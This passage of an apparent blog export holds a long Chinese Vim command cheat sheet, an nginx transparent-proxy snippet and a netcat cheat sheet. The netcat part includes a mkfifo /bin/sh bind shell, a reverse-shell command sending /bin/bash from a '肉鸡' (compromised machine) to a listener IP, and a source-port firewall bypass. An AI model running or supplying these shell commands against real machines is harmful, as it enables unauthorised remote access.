或 “marker” 时有效。\nzE     除去 (Eliminate) 窗口里“所有”的折叠。\n仅当 ‘foldmethod’ 设为 “manual” 或 “marker” 时有效。  \n关于vim的代码折叠，小弟也是初学，仅做参考。  \n\nzo 将当前折叠打开\nzc 折叠光标所在处\nzr 打开所有折叠层次（依层次打开）\nzm 折叠所有层次（依层次折叠）\nzR 打开所有折叠  zn\nzM 折叠所有      zN\nzi 切换折叠与不折叠指令  \n\nvim file1 file2 多个文件调入缓冲\n:e filename 在vim中再打开文件\n:ls 列出所有的缓冲区\n:n 编辑下一个文件\n:bp 跳转到上一个缓冲区\n:bn 跳转到下一个缓冲区\n:bN 跳转到指定编号的缓冲区:b3\n:bd1 删除编号为1的缓冲区  \n\n:tabnew 打开新标签页.\n:tabe file 在新标签页打开文件.\nctrl + PageUp, PageDown 切换标签页.\n:tabnext, tabprev 切换标签页，Putty 下只能用这个.  \n\n:e file 打开文件.\n:enew 新文件.\n:w 保存.\n:wa 全部保存.\n:w file 另存为.\n:wq 保存并退出.\n:q 退出.\n:qa 全部退出.\n:q! 强制退出.\nZZ 退出vim并保存文档  \n\nesc 切换命令模式 (距离太遥远了，用 Ctrl+C 代替吧).\ni 插入模式.\nI 在当前行开头插入.\nR 替换模式.\na 在光标后插入.\nA 在当前行尾部插入.\no 将在光标所在行下面加入一行，并进入编辑模式。\nO 将在光标上面加入一行,注意是大写。\nv Visual 模式按字符选择.\nV Visual 模式按行选择.  \n\n    h 左移光标.\n    j 下移光标.\n    k 上移光标.\n    l 右移光标.\n    gg 将光标移到文件头部.\n    G 将光标移到文件尾部.\n    #G 移动光标到指定行#. 例如: 5G\n    % 跳转到配对的括号去\n    [[ 跳转到代码块的开头去(但要求代码块中’{‘必须单独占一行)\n    gD 跳转到局部变量的定义处\n    ” 跳转到光标上次停靠的地方, 是两个’, 而不是一个”\n    mx 设置书签,x只能是a-z的26个字母\n    x 跳转到书签处(“”是1左边的键)\n    fx：移动光标到当前行的下一个 x 处。很明显，x 可以是任意一个字母，而且你可以使用 ; 来重复你的上一个 f 命令。\n    tx：和上面的命令类似，但是是移动到 x 的左边一个位置。（这真的很有用）\n    Fx：和 fx 类似，不过是往回找。  \n\n    w : 向后词移动 （前面加数字移动多少个词）\n    b : 向前词移动 （前面加数字移动多少个词）\n    e : 向后移到词末\n    ge : 向前移到词末  \n\n    0：移动光标到当前行首。\n    ^：移动光标到当前行的第一个字母位置。\n    $：移动光标到行尾。\n    )：移动光标到下一个句子。\n    ( ：移动光标到上一个句子\n    tx : 向右查找本行的x并移到那儿（大写时向左）\n    33G : 移到文件的第33行\n    gg : 文件首行\n    G : 文件尾行\n    33% : 文件的33%处\n    H/M/L : 屏幕的首/中/尾行\n    zt/zz/zb : 当前行移到屏幕的首/中/底部  \n\n     yy 拷贝当前行到剪贴板.\n    nyy 复制从当前行开始的n行\n     y^ 从文件头开始拷贝.\n     y$ 拷贝到文件尾部.\n     :#,\u0026y 拷贝 # 到 \u0026 行. 例如: 4,5y\n     p 在光标后粘贴.\n     P 粘贴到光标前.\n     dd 删除当前行.\n     d^ 删除到行首.\n     d$ 删除到行尾.\n     :#,\u0026d 删除 # 到 \u0026 行. 例如: 3,5d\n    D 当前光标开始删除到行尾\n    ndd 从当前行开始向后删除n行\n    d1G 删除第1行到当前行的数据\n    dnG 删除第n行到当前行的数据\n    dG 删除当前行到最后一行的数据  \n    x 向后删除1个字符\n    nx 向后删除n个字符\n    X 向前删除1个字符  \n\n缩进\n    增大缩进.\n\u003c\u003c 减少缩进.\n 自动缩进.  \n\n    /# 查找 #. 例如: /printf\n    ?# 反向查找 #.\n    n 查找下一个.\n    N 反向查找下一个.\n    :s/old/new/g 当前行无提示替换.\n    :%s/old/new/g 无提示替换.\n    :%s/old/new/gc 确认替换.\n    :#,\u0026s/old/new/g 从 # 到 \u0026 行无提示替换.\n    查找光标所在单词  \n\n:marks 查看所有书签, 输入 “:num” 可跳转.\nmname 定义书签, 如 ma 在当前行定义名为 a 的书签.\nname 跳转到某书签, “” 为键盘 Tab 上一行第一键.\n:jumps 查看所有跳转记录, 输入 “:num” 可跳转.\nctrl + o 返回上一次跳转处.\nctrl + i 和 ctrl + o 反向转处.  \n\n:! ctags -R . 生成 ctags 文件.\nctrl + ] 查看函数定义.\nctrl + T 返回.\nshift + k 查看函数 man 帮助信息.  \n\n! command 执行命令.\n:r file 插入文件内容.\n:r !command 插入命令输出结果.\n:cd path 修改默认工作目录.  \n\n自动补全  \nCtrl+X Ctrl+L整行补全  \nCtrl+X Ctrl+N 根据当前文件里关键字补全  \nCtrl+X Ctrl+K 根据字典补全  \nCtrl+X Ctrl+T 根据同义词字典补全  \nCtrl+X Ctrl+I 根据头文件内关键字补全  \nCtrl+X Ctrl+] 根据标签补全  \nCtrl+X Ctrl+F 补全文件名  \nCtrl+X Ctrl+D 补全宏定义  \nCtrl+X Ctrl+V 补全vim命令  \nCtrl+X Ctrl+U 用户自定义补全方式  \nCtrl+X Ctrl+S 拼写建议  \n\n分屏启动Vim    注释: n是数字，表示分成几个屏。  \nvim -On file1 file2 …     使用大写的O参数来垂直分屏。  \nvim -on file1 file2 …   使用小写的o参数来水平分屏。  \nCtrl+W c   关闭分屏  关闭当前窗口。  \nCtrl+W q    关闭当前窗口，如果只剩最后一个了，则退出Vim  \n分屏  \nCtrl+W s        上下分割当前打开的文件。  \n:sp filename    上下分割，并打开一个新的文件。  \nCtrl+W v    左右分割当前打开的文件。  \n:vsp filename    左右分割，并打开一个新的文件。  \n移动光标    Vi中的光标键是h, j, k, l，要在各个屏间切换，只需要先按一下Ctrl+W  \nCtrl+W l     把光标移到右边的屏。  \nCtrl+W h    把光标移到左边的屏中。  \nCtrl+W k    把光标移到上边的屏中。  \nCtrl+W j    把光标移到下边的屏中。  \nCtrl+W w    把光标移到下一个的屏中。.  \n移动分屏    这个功能还是使用了Vim的光标键，只不过都是大写。当然了，如果你的分屏很乱很复杂的话，这个功能可能会出现一些非常奇怪的症状。  \nCtrl+W L    向右移动。  \nCtrl+W H    向左移动  \nCtrl+W K    向上移动  \nCtrl+W J    向下移动  \n屏幕尺寸    下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用Ctrl+W 或是，但这可能需要最新的版本才支持。  \nCtrl+W =    让所有的屏都有一样的高度。  \nCtrl+W +    增加高度。  \nCtrl+W –    减少高度。  \nctrl+w   向右扩展  \nctrl+w \u003c    向左扩展  \n\n diff 模式  \n参考  \n比较 A ， B 文件， vim – d A B 或者这样  \n或先打开文件 A，然后 :vsp（全名vsplit） 打开 B，然后输入命令 :diffthis  \n或 vimdiff   FILELEFT FILERIGHT  \n]c 跳转到下一差异点  \n[c 反向跳转  \n\n上下文折叠 参考  \n默认情况下，vimdiff会将文件中不同之处上下6行之外的相同文本折叠隐藏，可通过 :set diffopt=context:3 修改显示的上下文行数。  \nzo 打开折叠  \nzc 关闭折叠  \n文件合并  \ndp 将当前窗口光标位置处的内容复制到另一窗口  \ndo 将另一窗口光标位置处的内容复制到当前窗口  \ndiffupdate 重新比较两个文件，如果手动修改文件的话有时不会自动同步  \n\ngg=G 源码格式化  \n:e! 强行重新编辑\nshift insert 从系统拷贝到vim\nu 撤销上一步操作.\nU 撤销最后编辑的行上的操作\n. 重做.\n键盘移动 (Move)  \n一切都从键盘的移动\nk -  上 up\nj -  下 down\nh -  左 left\nl -  右 right\nz -  重画屏幕，当前光标变成屏幕的第一行 (redraw current line at top of window)\nCTRL-f -  跳到下一页 (page down)\nCTRL-b -  跳到上一页 (page up)\n跳跃指令 (jumps)  \n跳跃指令类似于游览器中的前进后退按钮\nCTRL-] -  跟着link/tag转入 (follow link/tag)\nCTRL-o -  回到上一次的jump (go back)\nCTRL-i -  跳回下一个 (go forward)\n:ju -  显示所有的可以跳跃的地方 (print jump list)\n重做/回复  \nu -  undo\nCTRL-r -  redo\nvim的undo是树结构的，你可以回到这个结构中的任何地方\n:undo 2 -  undo 到结构的2层 (undo to tree 2)\n:undolist -  显示所有的undo列表 (show undo list)\n:earlier 10s -  undo到10秒前的编辑 (undo to 10 seconds ago)\n:earlier 10h -  undo到10小时前的编辑 (back to 10 hours ago)\n:earlier 1m -  undo到1分钟前 (back to 1 minutes ago)\n下面是undo的tree结构的解释\n………..one\n…………. |\n……..change 1\n…………. |\n………one too\n………. /……..\\\n…..change 2 ……. change 3\n………… | ………………… |\n…….one two ………. me too\n……….. |\n….. change 4\n………..|\n…… not two\n视觉模式 (visual)  \nv -  进入视觉模式\n在视觉模式内可以作block的编辑\nCTRL-v -  visual block\n打印 (print)  \n:hardcopy -  打印vim中的内容 (print text)\n混合视觉模式 (visual) 可以选择打印的区域\n没试过是否可以直接给值打印（应该可以）例如 :1,15hardcopy 打印前15行\n将文件写成网页格式 (html)  \n:source $VIMRUNTIME/syntax/2html.vim -  change current open file to html\n格式 (format)  \ndos/windows跟unix/linux对于文件的结束是不一样的。vim可以直接设定/更改格式\n用纸令:set fileformats=unix,dos 可以改变文件的格式 (change format)  \n:set ff=unix -  设定文件成unix格式 (set file in unix format)\n:set ff=dos -  设定文件成dos格式 (set file in dos format)\n:set ff? -  检查当前文件格式 (check the format of current file)\n如果改变格式，直接:w存档就会存成新的格式了。\n加密 (encryption)  \nvim可以给文件加密码\nvim -x 文件名 (filename) -  输入2次密码，保存后文件每次都会要密码才能进入 (encrypt the file with password)\nvim 处理加密文件的时候，并不会作密码验证，也就是说，当你打开文件的时候，vim不管你输入的密码是否正确，直接用密码对本文进行解密。如果密码错误，你看 到的就会是乱码，而不会提醒你密码错误（这样增加了安全性，没有地方可以得知密码是否正确）当然了，如果用一个够快的机器作穷举破解，vim还是可以揭开 的\nvim 语法显示 (syntax)  \n:syntax enable -  打开语法的颜色显示 (turn on syntax color)\n:syntax clear -  关闭语法颜色 (remove syntax color)\n:syntax off -  完全关闭全部语法功能 (turn off syntax)\n:syntax manual -  手动设定语法 (set the syntax manual, when need syntax use :set syntax=ON)\n输入特殊字符 (special character)  \nCTRL-v 编码就可以了\n例如 CTRL-v 273 -  ÿ 得到 ÿ\n二进 制文件 (binary file)  \nvim可以显示，编辑2进位文件  \nvim -b datafile\n:set display=uhex -  这样会以uhex显示。用来显示一些无法显示的字符（控制字符之类）(display in uhex play non-display char)  \n:%!xxd -  更改当前文件显示为2进位 (change display to binary)\n:%!xxd -r -  更改二进位为text格式 (convert back to text)\n自动完成 (auto-completion)  \nvim本身有自动完成功能（这里不是说ctag，而是vim内建的）\nCTRL-p -  向后搜索自动完成 (search backward)\nCTRL-n -  向前搜索自动完成 (search forward)\nCTRL-x+CTRL-o -  代码自动补全 (code completion)\n自动备份 (backup)  \nvim可以帮你自动备份文件（储存的时候，之前的文件备份出来）\n:set backup -  开启备份，内建设定备份文件的名字是 源文件名加一个 ‘~’ (enable backup default filename+~)\n:set backupext=.bak -  设定备份文件名为源文件名.bak (change backup as filename.bak)  \n自动备份有个问题就是，如果你多次储存一个文件，那么这个你的备份文件会被不断覆盖，你只能有最后一次存文件之前的那个备份。没关系，vim还提 供了patchmode，这个会把你第一次的原始文件备份下来，不会改动\n:set patchmode=.orig -  保存原始文件为 文件名.orig (keep orignal file as filename.orig)\n开启，保存与退出 （save \u0026 exit)  \n:w -  保存文件 (write file)\n:w! -  强制保存 (force write)\n:q -  退出文件 (exit file without save)\n:q! -  强制退出 (force quite without save)\n:e filename -  打开一个文件名为filename的文件 (open file to edit)\n:e! filename -  强制打开一个文件，所有未保存的东西会丢失 (force open, drop dirty buffer)\n:saveas filename -  另存为 filename (save file as filename)\n编辑指令 (edit)  \na -  在光表后插入 (append after cursor)\nA -  在一行的结尾插入 (append at end of the line)\ni -  在光标前插入 (insert before cursor)\nI -  在第一个非空白字符前插入 (insert before first non-blank)\no -  光标下面插入一个新行 (open line below)\nO -  光标上面插入一个新行 (open line above)\nx -  删除光标下（或者之后）的东西 (delete under and after cursor)\n例如x就是删除当前光标下，3x就是删除光标下+光标后2位字符\nX -  删除光标前的字符 (delete before cursor)\nd -  删除 (delete)\n可以用dd删除一行，或者3dw删除3个词等等\nJ -  将下一行提到这行来 (join line)\nr -  替换个字符 (replace characters)\nR -  替换多个字符 (replace mode – continue replace)\ngr -  不影响格局布置的替换 (replace without affecting layout)\nc -  跟d键一样，但是删除后进入输入模式 (same as “d” but after delete, in insert mode)\nS -  删除一行(好像dd一样）但是删除后进入输入模式 (same as “dd” but after delete, in insert mode)\ns -  删除字符，跟(d)一样，但是删除后进入输入模式 (same as “d” but after delete, in insert mode)\ns4s 会删除4个字符，进入输入模式 (delete 4 char and put in insert mode)\n~ -  更改大小写，大变小，小变大 (change case upper-  lower or lower-  upper)\ngu -  变成小写 (change to lower case)\n例如 guG 会把光标当前到文件结尾全部变成小写 (change lower case all the way to the end)\ngU -  变成大写 (change to upper case)\n例如 gUG 会把光标当前到文件结尾全部变成大写 (change upper case all the way to the end)\n复制与粘贴 (copy \u0026 paste)  \ny -  复制 (yank line)\nyy -  复制当前行 (yank current line)\n“{a-zA-Z}y -  把信息复制到某个寄存中 (yank the link into register {a-zA-Z})\n例如我用 “ayy 那么在寄存a，就复制了一行，然后我再用“byw复制一个词在寄存b\n粘贴的时候，我可以就可以选择贴a里面的东西还是b里面的，这个就好像是多个复制版一样\n“y -  这个是把信息复制进系统的复制版（可以在其他程序中贴出来）(yank to OS buffer)\np -  当前光标下粘贴 (paste below)\nP -  当前光标上粘贴 (paste above)\n“{a-zA-Z}p -  将某个寄存的内容贴出来 (paste from register)\n例如“ap那么就在当前光标下贴出我之前在寄存a中 的内容。“bP就在当前光标上贴出我之前寄存b的内容\n“p -  从系统的剪贴板中读取信息贴入vim (paste from OS buffer to vim)\nreg -  显示所有寄存中的内容 (list all registers)\n书签 (Mark)  \n书签是vim中非常强大的一个功能，书签分为文件书签跟全局书签。文件书签是你标记文件中的不同位置，然后可以在文件内快速跳转到你想要的位置。 而全局书签是标记不同文件中的位置。也就是说你可以在不同的文件中快速跳转  \nm{a-zA-Z} -  保存书签，小写的是文件书签，可以用(a-z）中的任何字母标记。大写的是全局 书签，用大写的(A-Z)中任意字母标记。(mark position as bookmark. when lower, only stay in file. when upper, stay in global)\n‘{a-zA-Z} -  跳转到某个书签。如果是全局书签，则会开启被书签标记的文件跳转至标记的行 (go to mark. in file {a-z} or global {A-Z}. in global, it will open the file)\n’0 -  跳转入现在编辑的文件中上次退出的位置 (go to last exit in file)\n” -  跳转如最后一次跳转的位置 (go to last jump -  go back to last jump)\n‘” -  跳转至最后一次编辑的位置 (go to last edit)\ng’{mark} -  跳转到书签 (jump to {mark})\n:delm{marks} -  删除一个书签 (delete a mark) 例如:delma那么就删除了书签a\n:delm! -  删除全部书签 (delete all marks)\n:marks -  显示系统全部书签 (show all bookmarks)\n标志 (tag)  \n:ta -  跳转入标志 (jump to tag)\n:ts -  显示匹配标志，并且跳转入某个标志 (list matching tags and select one to jump)\n:tags -  显示所有标志 (print tag list)\n运行外部命令 (using an external program)  \n:! -  直接运行shell中的一个外部命令 (call any external program)\n:!make -  就直接在当前目录下运行make指令了 (run make on current path)\n:r !ls -  读取外部运行的命令的输入，写入当然vim中。这里读取ls的输出 (read the output of ls and append the result to file)\n:3r !date -u -  将外部命令date -u的结果输入在vim的第三行中 (read the date -u, and append result to 3rd line of file)  \n:w !wc -  将vim的内容交给外部指令来处理。这里让wc来处理vim的内容 (send vim’s file to external command. this will send the current file to wc command)\nvim对于常用指令有一些内建，例如wc (算字数）(vim has some buildin functions, such like wc)\ng CTRL-G -  计算当前编译的文件的字数等信息 (word count on current buffer)\n!!date -  插入当前时间 (insert current date)\n多个文件的编辑 (edit multifiles)  \nvim可以编辑多个文件，例如\nvim a.txt b.txt c.txt 就打开了3个文件  \n:next -  编辑下一个文件 (next file in buffer)\n:next! -  强制编辑下个文件，这里指如果更改了第一个文件 (force to next file in buffer if current buffer changed)\n:wnext -  保存文件，编辑下一个 (save the file and goto next)\n:args -  查找目前正在编辑的文件名 (find out which buffer is editing now)\n:previous -  编辑上个文件 (previous buffer)\n:previous! -  强制编辑上个文件，同 :next! (force to previous buffer, same as :next!)\n:last -  编辑最后一个文件 (last buffer)\n:first -  编辑最前面的文件 (first buffer)\n:set autowrite -  设定自动保存，当你编辑下一个文件的时候，目前正在编辑的文件如果改动，将会自动保存 (automatic write the buffer when you switch to next buffer)\n:set noautowrite -  关闭自动保存 (turn autowrite off)\n:hide e abc.txt -  隐藏当前文件，打开一个新文件 abc.txt进行编辑 (hide the current buffer and edit abc.txt)\n:buffers -  显示所有vim中的文件 (display all buffers)\n:buffer2 -  编辑文件中的第二个 (edit buffer 2)  \nvim中很多东西可以用简称来写，就不用打字那么麻烦了，例如 :edit=:e, :next=:n 这样.\n分屏 (split)  \nvim提供了分屏功能（跟screen里面的split一样）\n:split -  将屏幕分成2个 (split screen)\n:split abc.txt -  将屏幕分成两个，第二个新的屏幕中显示abc.txt的内容 (split the windows, on new window, display abc.txt)\n:vsplit -  竖着分屏 (split vertically)\n:{d}split -  设定分屏的行数，例如我要一个屏幕只有20行，就可以下:20split (split the windows with {d} line. 20split: open new windows with 3 lines)\n:new -  分屏并且在新屏中建立一个空白文件 (split windows with a new blank file)\nCTRL-w+j/k/h/l -  利用CTRL加w加上j/k/h/l在不同的屏内切换 (switch, move between split screens)\nCTRL-w+ -/+ -  增减分屏的大小 (change split size)\nCTRL-w+t -  移动到最顶端的那个屏 (move to the top windows)\nCTRL-w+b -  移动到最下面的屏 (move to bottom window)\n:close -  关闭一个分出来的屏 (close splited screen)\n: only -  只显示光标当前屏 ，其他将会关闭(only display current active screen, close all others )\n:qall -  退出所有屏 (quite all windows)\n:wall -  保存所有屏 （write to all windows）\n:wqall -  保存并退出所有屏 (write and quite all windows)\n:qall! -  退出所有屏，不保存任何变动 (quite all windows without save)\n开启文件的时候，利用 -o选项，就可以直接开启多个文件在分屏中 (with -o option from command line, it will open files and display in split mode)\nvim -o a.txt b.txt  \n今天有人说不会看diff，其实vim也可以用来看diff，这个也是属于分屏的部分，这里也写一下。  \nvimdiff a.txt b.txt 如果直接给 -d选项是一样的 vim -d a.txt b.txt\n:diffsplit abc.txt 如果你现在已经开启了一个文件，想vim帮你区分你的文件跟abc.txt有什么区别，可以在vim中用diffsplit的方式打开第二个文件，这个时 候vim会用split的方式开启第二个文件，并且通过颜色，fold来显示两个文件的区别\n这样vim就会用颜色帮你区分开2个文件的区别。如果文件比较大（源码）重复的部分会帮你折叠起来（折叠后面会说）\n现在来说patch\n:diffpatch filename 通过:diffpatch 你的patch的文件名，就可以以当前文件加上你的patch来显示。vim会split一个新的屏，显示patch后的信息并且用颜色标明区别。\n如果不喜欢上下对比，喜欢左右（比较符合视觉）可以在前面加vert，例如：\n:vert diffsplit abc.txt\n:vert diffpatch abc.txt\n看完diff，用: only回到原本编辑的文件，觉 得diff的讨厌颜色还是在哪里，只要用:diffoff关闭就好了。\n还有个常用的diff中的就是 :diffu 这个是 :diffupdate 的简写，更新用\nTAB  \n除了split之外， vim还可以用 tab  \n:tab split filename -  这个就用tab的方式来显示多个文件 (use tab to display buffers)\ngt -  到下一个tab (go to next tab)\ngT -  到上一个tab (go to previous tab)\nvim大多数东西都是可一给数字来执行的，tab也是一样\n0gt -  跳到第一个tab (switch to 1st tab)\n5gt -  跳到第五个tab (switch to 5th tab)\n关闭所有的tab可以使用qall的指令。另外让vim在启动的时候就自动用tabnew的方式来开启多个文件，可以用alias\nlinux: 添加 alias vim=’vim -p’ 到 ~/.bashrc\nwindows: 自己写个vim.bat的文件，然后放在path中，文件内容：\n@echo off\nvim -p %\n当需要更改多个tab中的文件的时候，可以用 :tabdo 这个指令 这个就相当于 loop 到你的所有的 tab 中然后运行指令。\n例如有5个文件都在tab里面，需要更改一个变量名称：abc 到 def， 就可以用 :tabdo %s/abc/def/g 这样所有的5个tab里面的abc就都变成def了  \n折叠 (folding)  \nvim的折叠功能。。。我记得应该是6版出来的时候才推出的吧。这个对于写程序的人来说，非常有用。\nzfap -  按照段落折叠 (fold by paragraph)\nzo -  打开一个折叠 (open fold)\nzc -  关闭一个折叠 (close fold)\nzf -  创建折叠 (create fold) 这个可以用v视觉模式，可以直接给行数等等\nzr -  打开一定数量的折叠，例如3rz (reduce the folding by number like 3zr)\nzm -  折叠一定数量（之前你定义好的折叠） (fold by number)\nzR -  打开所有的折叠 (open all fold)\nzM -  关闭所有的摺叠 (close all fold)\nzn -  关闭折叠功能 (disable fold)\nzN -  开启折叠功能 (enable fold)\nzO -  将光标下所有折叠打开 (open all folds at the cursor line)\nzC -  将光标下所有折叠关闭 (close all fold at cursor line)\nzd -  将光标下的折叠删除，这里不是删除内容，只是删除折叠标记 (delete fold at cursor line)\nzD -  将光标下所有折叠删除 (delete all folds at the cursor line)\n按照tab来折叠，python最好用的 (ford by indent, very useful for python)\n:set foldmethod=indent -  设定后用zm 跟 zr 就可以的开关关闭了 (use zm zr)\n保存 (save view)  \n对于vim来说，如果你设定了折叠，但是退出文件，不管是否保持文件，折叠部分会自动消失的。这样来说非常不方便。所以vim给你方法去保存折 叠，标签，书签等等记录。最厉害的是，vim对于每个文件可以保存最多10个view，也就是说你可以对同一个文件有10种不同的标记方法，根据你的需 要，这些东西都会保存下来。\n:mkview -  保存记录 (save setting)\n:loadview -  读取记录 (load setting)\n:mkview 2 -  保存记录在寄存2 （save view to register 2)\n:loadview 3 -  从寄存3中读取记录 (load view from register 3)\n常用指令 (commands)  \n:set ic -  设定为搜索时不区分大小 写 (search case insensitive)\n:set noic -  搜索时区分大小写。 vim内定是这个(case sensitive )\n\u0026 -  重复上次的”:s” (repeat previous “:s”)\n. -  重复上次的指令 (repeat last command)\nK -  在man中搜索当前光标下的词 (search man page under cursor)\n{0-9}K -  查找当前光标下man中的章节，例如5K就是同等于man 5 (search section of man. 5K search for man 5)\n:history -  查看命令历史记录 (see command line history)\nq: -  打开vim指令窗口 (open vim command windows)\n:e -  打开一个文件，vim可以开启http/ftp/scp的文件 (open file. also works with http/ftp/scp)\n:e http://www.google.com/index.html -  这里就在vim中打开google的index.html (open google’s index.html)\n:cd -  更换vim中的目录 (change current directory in vim)\n:pwd -  显示vim当前目录 (display pwd in vim)\ngf -  打开文件。例如你在vim中有一行写了#include 那么在abc.h上面按gf，vim 就会把abc.h这个文件打开 (look for file. if you have a file with #include , then the cursor is on abc.h press gf, it will open the file abc.h in vim )\n记录指令 (record)  \nq{a-z} -  在某个寄存中记录指令 (record typed char into register)\nq{A-Z} -  将指令插入之前的寄存器 (append typed char into register{a-z})\nq -  结束记录 (stop recording)\n@{a-z} -  执行寄存中的指令 (execute recording)\n@@ -  重复上次的指令 (repeat previours :@{a-z})\n还是给个例子来说明比较容易明白\n我现在在一个文件中下qa指令,然后输入itest然后ESC然后q\n这里qa就是说把我的指令记录进a寄存，itest实际是分2步，i 是插入 (insert) 写入的文字是 text 然后用ESC退回指令模式q结束记录。这样我就把itest记录再一个寄存了。\n下面我执行@a那么就会自动插入test这个词。@@就重复前一个动作，所以还是等于@a\n搜索 (search)  \nvim超级强大的一个功能就是搜索跟替换了。要是熟悉正表达(regular expressions)这个搜索跟后面的替换将会是无敌利器（支持RE的编辑器不多吧）  \n从简单的说起\n-  光标下反向搜索关键词 (search the word under cursor backward)\n-  光标下正向搜索关键词 (search the word under cursor forward)\n/ -  向下搜索 (search forward)\n? -  向上搜索 (search back)\n这里可以用 /abc 或 ?abc的方式向上，向下搜索abc\n% -  查找下一个结束，例如在”(“下查找下一个”)”，可以找”()”, “[]” 还有shell中常用的 if, else这些 (find next brace, bracket, comment or if/#else/#endif)  \n下面直接用几个例子说话\n/a -  这个会搜到 a aa aaa\n/ab -  这个会搜到 ab abab ababab\n/ab\\+ -  这个会搜到 ab abb abbb\n/folers\\= -  这个会搜到 folder folders\n/ab\\{3,5} -  这个会搜到 abbb abbbb abbbbb\n/ab\\{-1,3} -  这个会在abbb中搜到ab (will match ab in abbb)\n/a.\\{-}b -  这个会在axbxb中搜到axb (match ‘axb’ in ‘axbxb’)\n/a.b -  会搜索到任何a开头后面有b的 (match ab any)\n/foo\\|bar -  搜索foo或者bar，就是同时搜索2个词 (match ‘foo’ or ‘bar’)\n/one\\|two\\|three -  搜索3个词 (match ‘one’, ‘two’ or ‘three’)\n/foo∥bar\\+ -  搜索foo, foobar, foofoo, barfoobar等等 (match ‘foo’, ‘foobar’, ‘foofoo’, ‘barfoobar’ … )\n/endif∥while∥for -  搜索endif, endwhile endfor (match ‘endif’, ‘endwhile’, ‘endfor’)\n/forever\\\u0026… -  这个会在forever中搜索到”for”但是不会在fortuin中搜索到”for” 因为我们这里给了\u0026…的限制 (match ‘for’ in ‘forever’ will not match ‘fortuin’)  \n特殊字符前面加^就可以 (for special character, user “^” at the start of range)\n/”*”\n这里解释一下\n” 双引号先引起来 (double quote)\n 任何不是双引号的东西(any character that is not a double quote)\n所有的其他 (as many as possible)\n” 结束最前面的引号 (double quote close)\n上面那个会搜到“foo” “3!x”这样的包括引号 (match “foo” -  and “3!x” include double quote)  \n更多例子，例如搜索车牌规则，假设车牌是 “1MGU103” 也就是说，第一个是数字，3个大写字幕，3个数字的格式。那么我们可以直接搜索所有符合这个规则的字符\n(A sample license plate number is “1MGU103″. It has one digit, three upper case\nletters and three digits. Directly putting this into a search pattern)\n这个应该很好懂，我们搜索\n\\数字\\大写字母\\大写字母\\大写字母\\数字\\数字\\数字  \n/\\d\\u\\u\\u\\d\\d\\d  \n另外一个方法，是直接定义几位数字（不然要是30位，难道打30个\\u去？）\n(specify there are three digits and letters with a count)  \n/\\d\\u\\{3}\\d\\{3}  \n也可以用范围来搜索 (Using [] ranges)\n/0-9\\{3}[0-9]\\{3}  \n用到范围搜索，列出一些范围(range)\n这个没什么好说了，看一下就都明白了，要全部记住。。。用的多了就记住了，用的少了就忘记了。每次看帮助，呵呵  \n/[a-z]\n/[0123456789abcdef] = /[0-9a-f]\n\\e\n\\t\n\\r\n\\b\n简写 (item matches equivalent)  \n\\d digit [0-9]\n\\D non-digit \n\\x hex digit [0-9a-fA-F]\n\\X non-hex digit \n\\s white space [ ] ( and )\n\\S non-white characters  (not and )\n\\l lowercase alpha [a-z]\n\\L non-lowercase alpha \n\\u uppercase alpha [A-Z]\n\\U non-uppercase alpha   \n:help /[] –  特殊的定义的，可以在vim中用用help来看 (everything about special)\n:help /\\s –  普通的也可以直接看一下 (everything about normal)\n替换 (string substitute) – RX  \n替换其实跟搜索是一样的。只不过替换是2个值，一个是你搜索的东西，一个是搜索到之后要替换的 string substitute (use rx)  \n%s/abc/def/ -  替换abc到def (substitute abc to def)\n%s/abc/def/c -  替换abc到def，会每次都问你确定(substitute on all text with confirmation (y,n,a,q,l))\n1,5s/abc/def/g -  只替换第一行到第15行之间的abc到def (substitute abc to def only between line 1 to 5)\n54s/abc/def/ -  只替换第54行的abc到def (only substitute abc to def on line 54)  \n结合上面的搜索正表达式，这个替换功能。。。就十分只强大。linux中很多地方都是用正表达来做事请的，所以学会了受益无穷。\n全局 (global)  \n这个不知道怎么翻译，反正vim是叫做global，可以对搜索到的东西执行一些vim的命令。我也是2-3个星期前因为读log中一些特殊的东 西，才学会用的。 (find the match pater and execute a command)  \nglobal具体自行方法是 g/pattern/command\n:g/abc/p -  查找并显示出只有abc的行 (only print line with “abc” )\n:g/abc/d -  删除所有有abc的行 (delete all line with “abc”)\n:v/abc/d -  这个会把凡是不是行里没有abc的都删掉 (delete all line without “abc”)\n信息过滤 (filter)  \nvim又一强大功能  \n! -  用!就是告诉vim，执行过滤流程 (tell vim to performing a filter operation)\n!5G -  从光标下向下5行执行过滤程序 (tell vim to start filter under cursor and go down 5 lines)  \n正式指令开始，这里用sort来做例子：\n!5Gsort -  从光标下开始执行sort，一共执行5行，就是说我只要sort5行而已 (this will sort the text from cursor line down to 5 lines)\n!Gsort -k3 -  可以直接代sort的参数，我要sort文字中的第三段 (sort to the end of file by column 3)\n!! -  值过滤当前的这行 (filter the current line)  \n如果觉得!这样的方法5G这样的方法用起来别扭（我是这么觉得），可以用标准的命令模式来做\n!其实就是个:.,而已 （to type the command）\n:.,start,end!sort 这里定义:.,起始行，结束行!运行指令\n:.,$!sort -  从当前这行一直执行至文件结束 (sort from current line to end)\n:.0,$!sort -  从文件的开始第一个行一直执行到文件结束 (sort from start of file to end)\n:.10,15!sort -  只在文件的第10行到第15行之间执行 (sort between line 10 to 15)","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx proxy透明代理","title":"Linux命令 Nginx proxy","text":"location / {\n    # 包含关键词 '计算机' 重定向至 /test\n    rewrite ^.计算机.$ /test last;\n\n    # 通用透明代理\n    proxypass $scheme://$host$requesturi;\n    proxysetheader Host $httphost;\n    proxybuffers 256 4k;\n    proxymaxtempfilesize 0k;\n}","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 netcat","title":"Linux命令 netcat","text":"转发本地端口\nnc -l 8001 -c \"nc localhost 8000\" 外网执行 监听本机8001端口，并将流量转发到8000\n\nrm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2  \u00261 | nc -l 127.0.0.1 9999   /tmp/f\n\n反向shell\n服务端 nc -l 1567\n肉鸡  nc 172.31.100.7 1567 -e /bin/bash\n\n  10. 指定源端口\n假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。\n$nc 172.31.100.7 1567 -p 25\n\n功能说明：功能强大的网络工具\n语　　法：nc -hlnruz] [-g网关...-i延迟秒数 -p通信端口-v...主机名称\n\n想要连接到某处: nc [-options] hostname port[s] [ports]\n绑定端口等待连接: nc -l -p port [-options] [hostname] [port]\n\n参数:\n-g gateway source-routing hop point[s], up to 8\n-G num source-routing 